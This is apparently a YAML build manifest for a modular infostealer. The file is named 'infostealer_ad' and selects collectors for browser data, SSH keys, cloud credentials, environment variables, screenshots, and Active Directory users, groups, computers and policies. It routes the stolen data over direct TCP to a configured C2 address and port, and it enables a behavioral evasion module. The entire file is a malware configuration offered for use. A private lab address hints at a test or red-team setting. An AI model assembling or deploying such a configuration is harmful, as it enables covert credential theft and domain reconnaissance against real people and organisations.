name: infostealer_ad
description: Full infostealer + AD enumeration (users, groups, computers, GPOs, domain info)

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops
  - ad/ldap_client

collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/installed_software
  - collectors/env_vars
  - collectors/browser_chromium
  - collectors/ssh_keys
  - collectors/cloud_creds
  - collectors/screenshot
  - collectors/security_products
  - collectors/ad_domain
  - collectors/ad_users
  - collectors/ad_groups
  - collectors/ad_computers
  - collectors/ad_gpos

exfil: exfil/tcp_direct
arch: arch/sequential

resources: true

evasion:
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
